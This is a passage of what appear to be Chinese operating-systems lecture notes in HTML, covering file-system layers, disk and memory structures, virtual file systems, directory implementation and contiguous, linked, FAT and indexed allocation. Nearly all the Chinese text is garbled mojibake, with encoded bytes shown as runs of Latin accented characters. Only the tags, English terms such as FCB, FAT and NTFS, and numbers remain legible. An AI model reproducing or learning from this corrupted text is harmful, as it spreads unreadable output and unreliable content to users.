ç£ç›˜ä¹‹é—´çš„ä¿¡æ¯ä¼ è¾“ã€‚ è®¾å¤‡é©±åŠ¨ç¨‹åºå¯ä»¥ä½œä¸ºç¿»è¯‘å™¨ã€‚ å…¶è¾“å…¥ç”±é«˜å±‚å‘½ä»¤ç»„æˆï¼Œ å¦‚ â€œ retrieve block 123â€  ã€‚å…¶è¾“å‡ºç”±åº•å±‚çš„ ã€ç¡¬ä»¶ç‰¹å®šçš„å‘½ä»¤ç»„æˆï¼Œ è¿™äº›å‘½ä»¤ç”¨äºæ§åˆ¶ç¡¬ä»¶æ§åˆ¶å™¨ï¼Œ é€šè¿‡ç¡¬ä»¶æ§åˆ¶å™¨å¯ä»¥ä½¿VO è®¾å¤‡ä¸ç³»ç»Ÿå…¶ä»–éƒ¨åˆ†ç›¸è¿ã€‚</p><p><strong>åŸºæœ¬æ–‡ä»¶ç³»ç»Ÿ</strong>åªéœ€è¦å‘åˆé€‚çš„è®¾å¤‡é©±åŠ¨ç¨‹åºå‘é€ä¸€èˆ¬å‘½ä»¤å°±å¯å¯¹ç£ç›˜ä¸Šçš„ç‰©ç†å—è¿›è¡Œè¯»å†™ã€‚æ¯ä¸ªå—ç”±å…¶æ•°å€¼ç£ç›˜åœ°å€æ¥æ ‡è¯†ï¼ˆä¾‹å¦‚ï¼Œé©±åŠ¨å™¨1ï¼ŒæŸ±é¢ï¼ˆ cylinder) 73ï¼Œç£é“ï¼ˆ track)3ï¼Œ æ‰‡åŒºï¼ˆsector) 10ï¼‰ã€‚</p><p><strong>æ–‡ä»¶ç»„ç»‡æ¨¡å—</strong>çŸ¥é“æ–‡ä»¶åŠå…¶é€»è¾‘å—å’Œç‰©ç†å—ã€‚ ç”±äºçŸ¥é“æ‰€ä½¿ç”¨çš„æ–‡ä»¶åˆ†é…ç±»å‹å’Œæ–‡ä»¶çš„ä½ç½®ï¼Œ æ–‡ä»¶ç»„ç»‡æ¨¡å—å¯ä»¥å°†é€»è¾‘å—åœ°å€è½¬æ¢æˆåŸºæœ¬æ–‡ä»¶ç³»ç»Ÿæ‰€ç”¨çš„ç‰©ç†å—åœ°å€ã€‚ æ¯ä¸ªæ–‡ä»¶çš„é€»è¾‘å—æŒ‰ä»0 æˆ–1åˆ°Næ¥ç¼–å·ï¼Œ è€ŒåŒ…å«æ•°æ®çš„ç‰©ç†å—å¹¶ä¸ä¸é€»è¾‘å·åŒ¹é…ï¼Œ å› æ­¤éœ€è¦é€šè¿‡ç¿»è¯‘æ¥å®šä½å—ã€‚ æ–‡ä»¶ç»„ç»‡æ¨¡å—ä¹ŸåŒ…æ‹¬ç©ºé—²ç©ºé—´ ç®¡ç†å™¨ï¼Œ ç”¨æ¥è·Ÿè¸ªæœªåˆ†é…çš„å—å¹¶æ ¹æ®è¦æ±‚æä¾›ç»™æ–‡ä»¶ç»„ç»‡æ¨¡å—ã€‚</p><p><strong>é€»è¾‘æ–‡ä»¶ç³»ç»Ÿ</strong>ç®¡ç†å…ƒæ•°æ®ã€‚å…ƒæ•°æ®åŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿçš„æ‰€æœ‰ç»“æ„æ•°æ®ï¼Œ è€Œä¸åŒ…æ‹¬å®é™…æ•°æ®ï¼ˆæˆ–æ–‡ä»¶å†…å®¹ï¼‰ã€‚é€»è¾‘æ–‡ä»¶ç³»ç»Ÿæ ¹æ®ç»™å®šç¬¦å·æ–‡ä»¶åæ¥ ç®¡ç†ç›®å½•ç»“æ„ï¼Œå¹¶æä¾›ç»™æ–‡ä»¶ç»„ç»‡æ¨¡å—æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚é€»è¾‘æ–‡ä»¶ç³»ç»Ÿé€šè¿‡æ–‡ä»¶æ§åˆ¶å—æ¥ç»´æŠ¤æ–‡ä»¶ç»“æ„ã€‚æ–‡ä»¶æ§åˆ¶å—ï¼ˆfile control block, FCBï¼‰ åŒ…å«æ–‡ä»¶çš„ä¿¡æ¯ï¼Œ å¦‚æ‹¥æœ‰è€…ã€æƒé™ã€æ–‡ä»¶å†…å®¹çš„ä½ç½®ã€‚ é€»è¾‘æ–‡ä»¶ç³»ç»Ÿä¹Ÿè´Ÿè´£ä¿æŠ¤å’Œå®‰å…¨ï¼ˆå‚è§ç¬¬10ç« å’Œç¬¬14ç« ï¼‰ã€‚</p><p>UNIXä½¿ç”¨UNIXæ–‡ä»¶ç³»ç»Ÿï¼ˆ<strong>UFS</strong>ï¼‰ï¼Œå®ƒæ˜¯åŸºäºä¼¯å…‹åˆ©å¿«é€Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆFFSï¼‰ çš„ã€‚</p><p>WindowsNTã€Windows2000ã€WindowsXPæ”¯æŒ ç£ç›˜æ–‡ä»¶ç³»ç»Ÿ <strong>FAT</strong>ã€<strong>FAT32</strong>å’Œ<strong>NTFS</strong></p><h2 id="112-æ–‡ä»¶ç³»ç»Ÿå®ç°"><a class="markdownIt-Anchor" href="#112-æ–‡ä»¶ç³»ç»Ÿå®ç°"></a> 11.2 æ–‡ä»¶ç³»ç»Ÿå®ç°</h2><h3 id="1121-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#1121-æ¦‚è¿°"></a> 11.2.1 æ¦‚è¿°</h3><p><strong>ç£ç›˜ç»“æ„</strong></p><p>åœ¨ç£ç›˜ä¸Šï¼Œæ–‡ä»¶ç³»ç»Ÿå¯èƒ½åŒ…æ‹¬å¦‚ä¸‹ä¿¡æ¯ï¼š</p><ul><li>å¦‚ä½•å¯åŠ¨æ‰€å­˜å‚¨çš„æ“ä½œç³»ç»Ÿ</li><li>æ€»çš„å—æ•°</li><li>ç©ºé—²å—çš„æ•°ç›®å’Œä½ç½®</li><li>ç›®å½•ç»“æ„ä»¥åŠå„ä¸ªå…·ä½“æ–‡ä»¶ç­‰</li></ul><p>ç£ç›˜ç»“æ„åŒ…æ‹¬</p><ul><li><strong>å¼•å¯¼æ§åˆ¶å—</strong>ï¼ˆboot control blockï¼‰ï¼šé€šå¸¸ä¸ºåˆ†åŒºçš„ç¬¬ä¸€å—ã€‚å¦‚æœè¯¥åˆ†åŒºæ²¡æœ‰OSï¼Œåˆ™ä¸ºç©ºã€‚ï¼ˆå…¶ä»–åç§°ï¼šå¼•å¯¼å—ï¼ˆLinuxï¼‰ã€åˆ†åŒºå¼•å¯¼æ‰‡åŒºï¼ˆWindowsNTï¼‰ï¼‰</li><li><strong>åˆ†åŒºæ§åˆ¶å—</strong>ï¼ˆpartition control blockï¼‰ï¼šåŒ…æ‹¬åˆ†åŒºè¯¦ç»†ä¿¡æ¯ï¼Œå¦‚åˆ†åŒºçš„å—æ•°ã€å—çš„å¤§å°ã€ç©ºé—²å—çš„æ•°é‡å’ŒæŒ‡é’ˆã€ç©ºé—²FCBçš„æ•°é‡å’ŒæŒ‡é’ˆç­‰ï¼ˆäº¦ç§°ä¸ºè¶…çº§å—ï¼ˆLinuxï¼‰ã€ä¸»æ§æ–‡ä»¶è¡¨ï¼ˆWindowsNTï¼‰ï¼‰</li><li>**ç›®å½•ç»“æ„ï¼š**ç”¨æ¥ç»„ç»‡æ–‡ä»¶</li><li>**æ–‡ä»¶æ§åˆ¶å—ï¼ˆFCBï¼‰ï¼š**åŒ…æ‹¬å¾ˆå¤šæ–‡ä»¶ä¿¡æ¯ï¼Œå¦‚æ–‡ä»¶è®¸å¯ã€æ‹¥æœ‰è€…ã€å¤§å°å’Œæ•°æ®å—çš„ä½ç½®ç­‰</li></ul><p><strong>å†…å­˜ä¸­ä¸æ–‡ä»¶ç›¸å…³çš„ç»“æ„</strong></p><ul><li><p>å†…å­˜åˆ†åŒºè¡¨ï¼šåŒ…å«æ‰€æœ‰å®‰è£…åˆ†åŒºçš„ä¿¡æ¯</p></li><li><p>å†…å­˜ç›®å½•ç»“æ„ï¼šä¿å­˜è¿‘æ¥è®¿é—®è¿‡çš„ç›®å½•ä¿¡æ¯ï¼ˆå¯¹å®‰è£…åˆ†åŒºçš„ç›®å½•ï¼Œå¯ä»¥åŒ…æ‹¬ä¸€ä¸ªæŒ‡å‘åˆ†åŒºè¡¨çš„æŒ‡é’ˆï¼‰</p></li><li><p>ç³»ç»ŸèŒƒå›´çš„æ‰“å¼€æ–‡ä»¶è¡¨ï¼šåŒ…æ‹¬æ¯ä¸ªæ‰“å¼€æ–‡ä»¶çš„FCBæ‹·è´å’Œå…¶ä»–ä¿¡æ¯</p></li><li><p>å•ä¸ªè¿›ç¨‹çš„æ‰“å¼€æ–‡ä»¶è¡¨ï¼šåŒ…æ‹¬ä¸€ä¸ªæŒ‡å‘ç³»ç»ŸèŒƒå›´å†…å·²æ‰“å¼€æ–‡ä»¶è¡¨ä¸­åˆé€‚æ¡ç›®å’Œå…¶ä»–ä¿¡æ¯çš„æŒ‡é’ˆ</p><ul><li><p>æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptor, Linux/UNIXï¼‰</p><p>æ–‡ä»¶æè¿°ç¬¦åœ¨å½¢å¼ä¸Šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚å½“ç¨‹åºæ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶æˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚æ–‡ä»¶è¿›ç¨‹æ§åˆ¶å—ä¸­éƒ½æœ‰ä¸€ä»½æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼ˆå¯ä»¥æŠŠå®ƒçœ‹æˆæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢çš„å…ƒç´ æ˜¯æŒ‡å‘fileç»“æ„ä½“æŒ‡é’ˆç±»å‹ï¼‰ï¼Œè¿™ä¸ªæ•°ç»„çš„ä¸‹æ ‡å°±æ˜¯æ–‡ä»¶æè¿°ç¬¦ã€‚æ–‡ä»¶æè¿°ç¬¦æ˜¯Linux/unixä¸‹çš„æ¦‚å¿µ</p></li><li><p>æ–‡ä»¶å¥æŸ„ï¼ˆfile handle, Windowsï¼‰</p><p>Windowsä¸‹çš„æ¦‚å¿µã€‚å¥æŸ„æ˜¯Windowsä¸‹å„ç§å¯¹è±¡çš„æ ‡è¯†ç¬¦ã€‚æ–‡ä»¶å¥æŸ„å’Œæ–‡ä»¶æè¿°ç¬¦ç±»ä¼¼ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œä¹Ÿç”¨äºå®šä½æ–‡ä»¶æ•°æ®åœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚</p></li></ul></li></ul><h3 id="1122-åˆ†åŒºä¸å®‰è£…"><a class="markdownIt-Anchor" href="#1122-åˆ†åŒºä¸å®‰è£…"></a> 11.2.2 åˆ†åŒºä¸å®‰è£…</h3><h3 id="1123-è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#1123-è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"></a> 11.2.3 è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h3><p>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ(VFS)æä¾›äº†ä¸€ç§é¢å‘å¯¹è±¡çš„æ–¹æ³•æ¥å®ç°æ–‡ä»¶ç³»ç»Ÿ</p><p>VFSå…è®¸åœ¨ä¸åŒç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿä¸Šé‡‡ç”¨åŒæ ·çš„ç³»ç»Ÿè°ƒç”¨æ¥å£ï¼ˆAPIï¼‰</p><ul><li>APIæ˜¯é’ˆå¯¹VFSçš„æ¥å£ï¼Œè€Œéå¯¹ä»»ä½•ç‰¹å®šç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿ</li></ul><p>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿå®ç°çš„ç›®æ ‡æ˜¯ï¼š</p><ul><li>åŒæ—¶æ”¯æŒå¤šç§æ–‡ä»¶ç³»ç»Ÿï¼Œç³»ç»Ÿä¸­å®‰è£…å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿæ—¶ï¼Œå¯¹ç”¨æˆ·è€Œè¨€æ²¡æœ‰åŒºåˆ«ï¼Œä»–ä»¬éƒ½è¡¨ç°ä¸ºä¸€è‡´çš„æ¥å£ã€‚</li></ul><h2 id="113-ç›®å½•å®ç°"><a class="markdownIt-Anchor" href="#113-ç›®å½•å®ç°"></a> 11.3 ç›®å½•å®ç°</h2><h3 id="1131-çº¿æ€§åˆ—è¡¨"><a class="markdownIt-Anchor" href="#1131-çº¿æ€§åˆ—è¡¨"></a> 11.3.1 çº¿æ€§åˆ—è¡¨</h3><p>æœ€ä¸ºç®€å•çš„ç›®å½•å®ç°æ–¹æ³•æ˜¯ä½¿ç”¨å­˜å‚¨æ–‡ä»¶åå’Œæ•°æ®å—æŒ‡é’ˆçš„çº¿æ€§åˆ—è¡¨ã€‚</p><p>è¿™ç§æ–¹æ³•ç¼–ç¨‹ç®€å•ä½†è¿è¡Œæ—¶è¾ƒä¸ºè´¹æ—¶ã€‚</p><p>è¦åˆ›å»ºæ–°æ–‡ä»¶ï¼Œå¿…é¡»é¦–å…ˆæœç´¢ç›®å½•ä»¥ç¡®å®šæ²¡æœ‰åŒæ ·åç§°çš„æ–‡ä»¶å­˜åœ¨ã€‚æ¥ç€ï¼Œåœ¨ç›®å½•åå¢åŠ ä¸€ä¸ªæ–°æ¡ç›®ã€‚è¦åˆ é™¤æ–‡ä»¶æ—¶ï¼Œæ ¹æ®ç»™å®šæ–‡ä»¶åæœç´¢ç›®å½•ï¼Œæ¥ç€é‡Šæ”¾åˆ†é…ç»™å®ƒçš„ç©ºé—´ã€‚</p><h3 id="1132-å“ˆå¸Œè¡¨"><a class="markdownIt-Anchor" href="#1132-å“ˆå¸Œè¡¨"></a> 11.3.2 å“ˆå¸Œè¡¨</h3><p>ç”¨äºæ–‡ä»¶ç›®å½•çš„å¦ä¸€ä¸ªæ•°æ®ç»“æ„æ˜¯å“ˆå¸Œè¡¨ã€‚é‡‡ç”¨è¿™ç§æ–¹æ³•æ—¶ï¼Œé™¤äº†ä½¿ç”¨çº¿æ€§åˆ—è¡¨å­˜å‚¨ç›®å½•æ¡ç›®å¤–ï¼Œ è¿˜ä½¿ç”¨äº†å“ˆå¸Œæ•°æ®ç»“æ„ã€‚ å“ˆå¸Œè¡¨æ ¹æ®æ–‡ä»¶åå¾—åˆ°ä¸€ä¸ªå€¼ï¼Œ äº•è¿”å›ä¸€ä¸ªæŒ‡å‘çº¿æ€§åˆ—è¡¨ä¸­å…ƒç´ çš„æŒ‡é’ˆã€‚</p><p>å› æ­¤ï¼Œ å®ƒå¤§å¤§åœ°å‡å°‘ç›®å½•æœç´¢æ—¶é—´ã€‚ æ’å…¥å’Œåˆ é™¤ä¹Ÿè¾ƒç®€å•ï¼Œ ä¸è¿‡éœ€è¦ä¸€äº›é¢„å¤‡æªæ–½æ¥é¿å…å†²çªï¼ˆcollision) ï¼ˆä¸¤ä¸ªæ–‡ä»¶åå“ˆå¸Œåˆ°ç›¸åŒçš„ä½ç½®ã€‰ã€‚</p><h2 id="114-åˆ†é…æ–¹æ³•"><a class="markdownIt-Anchor" href="#114-åˆ†é…æ–¹æ³•"></a> 11.4 åˆ†é…æ–¹æ³•</h2><p>å¸¸ç”¨çš„ä¸»è¦ç£ç›˜ç©ºé—´åˆ†é…æ–¹æ³•æœ‰ä¸‰ä¸ªï¼š è¿ç»­ã€é“¾æ¥å’Œç´¢å¼•ã€‚æ¯ç§æ–¹æ³•éƒ½æœ‰å…¶ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚</p><h3 id="1141-è¿ç»­åˆ†é…"><a class="markdownIt-Anchor" href="#1141-è¿ç»­åˆ†é…"></a> 11.4.1 è¿ç»­åˆ†é…</h3><p><strong>è¿ç»­åˆ†é…</strong>ï¼ˆcontiguous allocationï¼‰ æ–¹æ³•è¦æ±‚æ¯ä¸ªæ–‡ä»¶åœ¨ç£ç›˜ä¸Šå æœ‰ä¸€ç»„è¿ç»­çš„å—ã€‚</p><p>æ–‡ä»¶çš„è¿ç»­åˆ†é…å¯ä»¥ç”¨ç¬¬ä¸€å—çš„ç£ç›˜åœ°å€å’Œè¿ç»­å—çš„æ•°é‡æ¥å®šä¹‰ã€‚ å¦‚æœæ–‡ä»¶æœ‰nå—é•¿å¹¶ä»ä½ç½®bå¼€å§‹ï¼Œ é‚£ä¹ˆè¯¥æ–‡ä»¶å°†å æœ‰å—b,b+I,b+2 â€¦ï¼Œb+nä¸€ 1ã€‚ ä¸€ä¸ªæ–‡ä»¶çš„ç›®å½•æ¡ç›®åŒ…æ‹¬å¼€å§‹å—çš„åœ°å€å’Œè¯¥æ–‡ä»¶æ‰€åˆ†é…åŒºåŸŸçš„é•¿åº¦ï¼Œ å‚è§å›¾11.5ã€‚</p><p><img src="/posts/8ce3e425/image-20220108140304356.png" alt="image-20220108140304356"></p><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>é‡‡ç”¨è¿™ç§åºåˆ—ï¼Œå‡è®¾åªæœ‰ä¸€ä¸ªä½œä¸šè®¿é—®ç£ç›˜ï¼Œåœ¨è®¿é—®å—båè®¿é—®å—b+1é€šå¸¸ä¸éœ€è¦ç§»åŠ¨ç£å¤´ã€‚å½“éœ€è¦ç£å¤´ç§»åŠ¨ï¼ˆä»ä¸€ä¸ªæŸ±é¢çš„æœ€åæ‰‡åŒºåˆ°ä¸‹ ä¸€ä¸ªæŸ±é¢çš„ç¬¬ä¸€æ‰‡åŒºï¼‰ï¼Œåªéœ€è¦ç§»åŠ¨ä¸€ä¸ªç£é“ã€‚å› æ­¤ï¼Œç”¨äºè®¿é—®è¿ç»­åˆ†é…æ–‡ä»¶æ‰€éœ€è¦çš„å¯»é“æ•°æœ€å°ï¼Œåœ¨ç¡®å®éœ€è¦å¯»é“æ—¶æ‰€éœ€è¦çš„å¯»é“æ—¶é—´ä¹Ÿæœ€å°ã€‚</li><li>è¿ç»­åˆ†é…æ”¯æŒé¡ºåºè®¿é—®å’Œç›´æ¥è®¿é—®</li><li>ç®€å• ï¼ åªéœ€è¦è®°å½•æ–‡ä»¶çš„èµ·å§‹ä½ç½®ï¼ˆå—å·ï¼‰åŠé•¿åº¦ã€‚</li></ul><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>ä¸ºæ–°æ–‡ä»¶æ‰¾åˆ°ç©ºé—´æ¯”è¾ƒå›°éš¾ã€‚ æœ‰å¤–éƒ¨ç¢ç‰‡ï¼ˆexternal fragmentationï¼‰é—®é¢˜ã€‚</li><li>è¿ç»­åˆ†é…çš„å¦ä¸€ä¸ªé—®é¢˜æ˜¯ç¡®å®šä¸€ä¸ªæ–‡ä»¶éœ€è¦å¤šå°‘ç©ºé—´ã€‚</li></ul><h3 id="1142-é“¾æ¥åˆ†é…"><a class="markdownIt-Anchor" href="#1142-é“¾æ¥åˆ†é…"></a> 11.4.2 é“¾æ¥åˆ†é…</h3><p><strong>é“¾æ¥åˆ†é…</strong>ï¼ˆlinked allocationï¼‰ è§£å†³äº†è¿ç»­åˆ†é…çš„æ‰€æœ‰é—®é¢˜ã€‚ é‡‡ç”¨é“¾æ¥åˆ†é…ï¼Œ æ¯ä¸ªæ–‡ä»¶æ˜¯ç£ç›˜å—çš„é“¾è¡¨ï¼š ç£ç›˜å—åˆ†å¸ƒåœ¨ç£ç›˜çš„ä»»ä½•åœ°æ–¹ã€‚ ç›®å½•åŒ…æ‹¬æ–‡ä»¶ç¬¬ä¸€å—çš„æŒ‡é’ˆå’Œæœ€åä¸€å—çš„æŒ‡é’ˆã€‚ ä¾‹å¦‚ï¼Œ ä¸€ä¸ªæœ‰ 5 å—çš„æ–‡ä»¶å¯èƒ½ä»å— 9 å¼€å§‹ï¼Œç„¶è€Œæ˜¯å— 16ã€ å— 1 ã€ å— 10ï¼Œæœ€åæ˜¯å—25 ï¼ˆè§å›¾ 11.6ï¼‰ã€‚æ¯å—éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€å—çš„æŒ‡é’ˆã€‚ç”¨æˆ·ä¸èƒ½ä½¿ç”¨è¿™äº›æŒ‡é’ˆã€‚å› æ­¤ï¼Œå¦‚æœæ¯å—æœ‰ 512Bï¼Œ ç£ç›˜åœ°å€ä¸º 4Bï¼Œ é‚£ä¹ˆç”¨æˆ·å¯ä»¥ä½¿ç”¨ 508Bã€‚</p><p><img src="/posts/8ce3e425/image-20220108140920356.png" alt="image-20220108140920356"></p><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>é‡‡ç”¨é“¾æ¥åˆ†é…æ²¡æœ‰å¤–éƒ¨ç¢ç‰‡ï¼Œç©ºé—²ç©ºé—´åˆ—è¡¨ä¸Šçš„ä»»ä½•å—å¯ä»¥ç”¨æ¥æ»¡è¶³è¯·æ±‚ã€‚</li><li>æ–‡ä»¶åˆ›å»ºä¸å¢é•¿å®¹æ˜“ï¼Œå½“åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œå¹¶ä¸éœ€è¦è¯´æ˜æ–‡ä»¶å¤§å°ã€‚ åªè¦æœ‰ç©ºé—²å—ï¼Œæ–‡ä»¶å°±å¯ä»¥å¢å¤§ã€‚ å› æ­¤ï¼Œæ— éœ€åˆå¹¶ç£ç›˜ç©ºé—´ã€‚</li></ul><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>ä¸»è¦é—®é¢˜æ˜¯å®ƒåªèƒ½æœ‰æ•ˆåœ°ç”¨äºæ–‡ä»¶çš„é¡ºåºè®¿é—®ã€‚ è¦æ‰¾åˆ°æ–‡ä»¶çš„ç¬¬iå—ï¼Œå¿…é¡»ä»æ–‡ä»¶çš„å¼€å§‹èµ·ï¼Œè·Ÿç€æŒ‡é’ˆï¼Œæ‰¾åˆ°ç¬¬iå—ã€‚ å¯¹æŒ‡é’ˆçš„æ¯æ¬¡è®¿é—®éƒ½éœ€è¦è¯»ç£ç›˜ï¼Œæœ‰æ—¶éœ€è¦è¿›è¡Œç£ç›˜å¯»é“ã€‚ å› æ­¤ï¼Œé“¾æ¥åˆ†é…ä¸èƒ½æœ‰æ•ˆåœ°æ”¯æŒæ–‡ä»¶çš„ç›´æ¥è®¿é—®ã€‚</li><li>é“¾æ¥åˆ†é…çš„å¦ä¸€ç¼ºç‚¹æ˜¯æŒ‡é’ˆéœ€è¦ç©ºé—´ã€‚å¦‚æœæŒ‡é’ˆéœ€è¦ä½¿ç”¨ 512B å—ä¸­çš„4Bï¼Œé‚£ä¹ˆ0.78%çš„ç£ç›˜ç©ºé—´å°†ä¼šç”¨äºæŒ‡é’ˆï¼Œè€Œä¸æ˜¯å…¶ä»–ä¿¡æ¯ã€‚ å› è€Œï¼Œæ¯ä¸ªæ–‡ä»¶ä¹Ÿéœ€è¦æ¯”åŸæ¥æ›´å¤šçš„ç©ºé—´ã€‚</li><li>é“¾æ¥åˆ†é…å­˜åœ¨å¯é æ€§é—®é¢˜ã€‚ä¼šæœ‰æŒ‡é’ˆæŸåæˆ–ä¸¢å¤±é—®é¢˜ã€‚</li></ul><p>ä¸€ ä¸ªé‡‡ç”¨ é“¾æ¥åˆ†é…æ–¹æ³•çš„å˜ç§æ˜¯**æ–‡ä»¶åˆ†é…è¡¨ï¼ˆFATï¼‰**çš„ä½¿ç”¨ ã€‚ è¿™ä¸€ç®€å•ä½†æœ‰æ•ˆçš„ç£ç›˜ç©ºé—´åˆ†é…ç”¨äºMS-DOSå’ŒOS/2æ“ä½œç³»ç»Ÿã€‚</p><p>FATçš„ä½¿ç”¨ä¸é“¾è¡¨ç›¸ä¼¼ã€‚ ç›®å½•æ¡ç›®å«æœ‰æ–‡ä»¶é¦–å—çš„å—å·ç ã€‚æ ¹æ®å—å·ç ç´¢å¼•çš„FATæ¡ç›®åŒ…å« æ–‡ä»¶ä¸‹ä¸€å—çš„å—å·ç ã€‚ è¿™æ¡é“¾ä¼šä¸€ç›´ç»§ç»­åˆ°æœ€åä¸€å—ï¼Œè¯¥å—å¯¹åº”FATæ¡ç›®çš„å€¼ä¸ºæ–‡ä»¶ç»“æŸå€¼ã€‚æœªä½¿ç”¨çš„å—ç”¨0å€¼æ¥è¡¨ç¤ºã€‚</p><p><img src="/posts/8ce3e425/image-20220108141639269.png" alt="image-20220108141639269"></p><h3 id="1143-ç´¢å¼•åˆ†é…"><a class="markdownIt-Anchor" href="#1143-ç´¢å¼•åˆ†é…"></a> 11.4.3 ç´¢å¼•åˆ†é…</h3><p><strong>ç´¢å¼•åˆ†é…</strong>ï¼ˆindexed allocationï¼‰é€šè¿‡æŠŠæ‰€æœ‰æŒ‡é’ˆæ”¾åœ¨ä¸€èµ·ï¼Œ å³é€šè¿‡ç´¢å¼•å—è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p><p>å½“åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œ ç´¢å¼•å—çš„æ‰€æœ‰æŒ‡é’ˆéƒ½è®¾ä¸º nullã€‚ å½“é¦–æ¬¡å†™å…¥ç¬¬iå—æ—¶ï¼Œ å…ˆä»ç©ºé—²ç©ºé—´ç®¡ç†å™¨ä¸­å¾—åˆ°ä¸€å—ï¼Œ å†å°†å…¶åœ°å€å†™åˆ°ç´¢å¼•å—çš„ç¬¬iä¸ªæ¡ç›®ã€‚</p><p><img src="/posts/8ce3e425/image-20220108151724583.png" alt="image-20220108151724583"></p><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>ç´¢å¼•åˆ†é…æ”¯æŒç›´æ¥è®¿é—®ï¼Œ ä¸”æ²¡æœ‰å¤–éƒ¨ç¢ç‰‡é—®é¢˜ï¼Œ è¿™æ˜¯å› ä¸ºç£ç›˜ä¸Šçš„ä»»ä¸€å—éƒ½å¯æ»¡è¶³æ›´å¤šç©ºé—´çš„è¦æ±‚ã€‚</li><li>ä¿æŒäº†é“¾æ¥ç»“æ„çš„ä¼˜ç‚¹ï¼Œåˆè§£å†³äº†å…¶ç¼ºç‚¹ï¼š</li><li>å³èƒ½é¡ºåºå­˜å–ï¼Œåˆèƒ½éšæœºå­˜å–</li><li>æ»¡è¶³äº†æ–‡ä»¶åŠ¨æ€å¢é•¿ã€æ’å…¥åˆ é™¤çš„è¦æ±‚</li><li>èƒ½å……åˆ†åˆ©ç”¨å¤–å­˜ç©ºé—´</li></ul><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>ç´¢å¼•åˆ†é…ä¼šæµªè´¹ç©ºé—´ã€‚ç´¢å¼•å—æŒ‡é’ˆçš„å¼€é”€é€šå¸¸è¦æ¯”é“¾æ¥åˆ†é…æŒ‡é’ˆçš„å¼€é”€å¤§ã€‚è®¾æƒ³ä¸€ä¸‹åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ æ¯ä¸ªæ–‡ä»¶åªæœ‰ä¸€å—æˆ–ä¸¤å—é•¿ã€‚ é‡‡ç”¨é“¾æ¥åˆ†é…ï¼Œ æ¯å—åªæµªè´¹ä¸€ä¸ªæŒ‡é’ˆã€‚ é‡‡ç”¨ç´¢å¼•åˆ†é…ï¼Œ å°½ç®¡åªæœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ªæŒ‡é’ˆä¸ºéç©ºï¼Œ ä¹Ÿå¿…é¡»åˆ†é…ä¸€ä¸ªå®Œæ•´çš„ç´¢å¼•å—ã€‚</li><li>ç´¢å¼•åˆ†é…æ–¹æ¡ˆä¸é“¾æ¥åˆ†é…ä¸€æ ·åœ¨æ€§èƒ½æ–¹é¢æœ‰æ‰€æ¬ ç¼ºã€‚ ç‰¹åˆ«æ˜¯ï¼Œ è™½ç„¶ç´¢å¼•å—å¯ä»¥ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œä½†æ˜¯æ•°æ®å—å¯èƒ½åˆ†å¸ƒåœ¨æ•´ä¸ªåˆ†åŒºä¸Šã€‚</li></ul><p><strong>ç¡®å®šç´¢å¼•å—å¤§å°çš„æœºåˆ¶ï¼š</strong></p><ul><li>é“¾æ¥æ–¹æ¡ˆï¼šä¸€ä¸ªç´¢å¼•å—é€šå¸¸ä¸ºä¸€ä¸ªç£ç›˜å—ã€‚ å› æ­¤ï¼Œ å®ƒæœ¬èº«èƒ½ç›´æ¥è¯»å†™ã€‚ ä¸ºäº†å¤„ç†å¤§æ–‡ä»¶ï¼Œ å¯ä»¥å°†å¤šä¸ªç´¢å¼•å—é“¾æ¥èµ·æ¥ã€‚ ä¾‹å¦‚ï¼Œ ä¸€ä¸ªç´¢å¼•å—å¯ä»¥åŒ…æ‹¬ä¸€ä¸ªå«æœ‰æ–‡ä»¶åçš„å¤´éƒ¨å’Œä¸€ç»„å¤´100ä¸ªç£ç›˜å—çš„åœ°å€ã€‚ ä¸‹ä¸€ä¸ªåœ°å€ï¼ˆç´¢å¼•å—çš„æœ€åä¸€ä¸ªè¯ï¼‰ä¸º nil ï¼ˆå¯¹äºå°æ–‡ä»¶ã€‰æˆ–æŒ‡å‘å¦ ä¸€ä¸ªç´¢å¼•å—ï¼ˆå¤§æ–‡ä»¶ï¼‰ã€‚</li><li>å¤šå±‚ç´¢å¼•ï¼šé“¾æ¥è¡¨ç¤ºçš„ä¸€ç§å˜ç§æ˜¯ç”¨ç¬¬ä¸€å±‚ç´¢å¼•å—æŒ‡å‘ä¸€ç»„ç¬¬äºŒå±‚çš„ç´¢å¼•å—ï¼Œ ç¬¬äºŒå±‚ç´¢å¼•å—å†æŒ‡å‘æ–‡ä»¶å—ã€‚ 